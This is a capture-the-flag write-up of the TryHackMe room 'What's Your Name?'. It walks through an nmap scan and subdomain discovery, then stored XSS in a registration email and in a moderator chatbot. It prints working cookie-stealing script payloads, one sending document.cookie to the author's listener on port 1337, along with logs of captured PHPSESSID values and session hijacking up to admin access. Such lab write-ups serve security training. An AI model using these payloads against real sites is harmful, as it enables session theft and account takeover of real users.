---
title: "TryHackMe - What's Your Name?"
date: 2025-06-20 12:00:00 +0000
author: scr4tcher
categories: [TryHackMe CTF]
tags: [xss, CSRF ]
--- 


This challenge will test client-side exploitation skills, from inspecting Javascript to manipulating cookies to launching CSRF/XSS attacks.

## Reconnaissance

I started with a full port scan using **nmap** to identify open services on the target machine:

```
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap  -T4 -sV -sC -p- 10.10.26.74 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-20 06:44 EDT
Nmap scan report for worldwap.thm (10.10.26.74)
Host is up (0.061s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 dd:53:33:5b:68:eb:0b:e0:0a:2a:f0:fa:a3:5e:93:10 (RSA)
|   256 00:87:b6:51:1e:89:b6:30:67:33:36:c2:e6:30:dc:5d (ECDSA)
|_  256 5b:5e:b7:d6:24:3a:0a:d1:c5:cf:37:9a:e5:b9:df:ec (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-title: Welcome
|_Requested resource was /public/html/
8081/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Scan results : 

- 22/tcp   open  ssh     OpenSSH 8.2p1 (Ubuntu)
- 80/tcp   open  http    Apache httpd 2.4.41
- 8081/tcp open  http    Apache httpd 2.4.41

## Web enumaration

After adding the domain `worldwap.thm` to my `/etc/hosts` file, I visited the website. The main page allowed me to register an account. After successful registration, I saw a message:

> "You'd need to visit login.worldwap.thm to login once you register successfully."

![1](/images/whatsyourname/1.jpg)

I added that subdomain to my hosts file too and navigated to it.

The page was blank at first glance, but checking the source code revealed this comment:


![2](/images/whatsyourname/2.jpg)
So I manually visited http://login.worldwap.thm/login.php and found a login form.

![3](/images/whatsyourname/3.jpg)

Unfortunately, the credentials I created earlier didn’t work.
![3b](/images/whatsyourname/3b.jpg)

## Stealing a Moderator's Cookie via XSS 

Suspecting a vulnerability, I attempted to inject a simple XSS payload by sending an email that contained this script: 

![4](/images/whatsyourname/4.jpg)

```
<script>new Image().src='http://10.23.x.x:1337/log?c='+document.cookie</script>
```
> This script sends the victim’s cookies to my server running on port 1337.

I hosted a listener with Python:

```
sudo python3 -m http.server 1337
```


And it worked! I received requests with the following data:

```
┌──(kali㉿kali)-[~/Desktop]
└─$ python3 -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
10.10.26.74 - - [20/Jun/2025 07:06:00] code 404, message File not found
10.10.26.74 - - [20/Jun/2025 07:06:00] "GET /log?c=PHPSESSID=8ss9dd7o48h9821sttmv66vjrh HTTP/1.1" 404 -
10.10.26.74 - - [20/Jun/2025 07:07:01] code 404, message File not found
10.10.26.74 - - [20/Jun/2025 07:07:01] "GET /log?c=PHPSESSID=7c42qdip0p52292bvpfkh79pop HTTP/1.1" 404 
```

## Using the Stolen Session

I copied one of the stolen PHPSESSID values and injected it into my browser cookies. Then I reloaded http://login.worldwap.thm/login.php and logged in using the default credentials: hacker:hacker.

This time, I was successfully logged in as a moderator.


![5](/images/whatsyourname/5.jpg)
![6](/images/whatsyourname/6.jpg)



## Eploiting the Chat Bot with XSS again

On the moderator page, I noticed a chatbot feature. I tested it for XSS and, unsurprisingly, it was also vulnerable.


![7](/images/whatsyourname/7.jpg)



I sent the following payload to the chatbot:



```
<script>
fetch("/chat.php", {
    "credentials": "include",
    "headers": {
        "Content-Type": "application/x-www-form-urlencoded"
    },
    "body": "message="+document.cookie,
    "method": "POST",
    "mode": "cors"
});
</script>
```

 **What Does This Script Do?**

- fetch(): A modern JavaScript API for making HTTP requests.

- /chat.php: The endpoint used by the chatbot.

- credentials: "include": Ensures the victim's cookies are included in the request.

- body: "message="+document.cookie: Sends the session cookie in the message field.

This trick allowed me to capture the admin's session cookie.

## Admin Access Achieved 

After replacing my browser cookie with the stolen admin session, I refreshed the page and was immediately logged in as the administrator.

![8](/images/whatsyourname/8.jpg)